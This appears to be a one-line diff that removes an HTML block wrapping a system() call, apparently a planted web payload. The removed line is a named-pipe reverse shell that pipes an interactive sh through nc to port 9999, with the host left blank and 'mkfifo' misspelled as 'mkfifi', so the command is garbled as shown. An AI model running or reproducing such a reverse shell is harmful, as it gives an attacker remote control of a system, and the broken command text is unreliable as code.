@@ -1,1 +1,0 @@
-<pre>system('rm /tmp/f; mkfifi /tmp/f; cat /tmp/f | sh -i 2>&1 | nc  9999 > /tmp/f;')</pre>
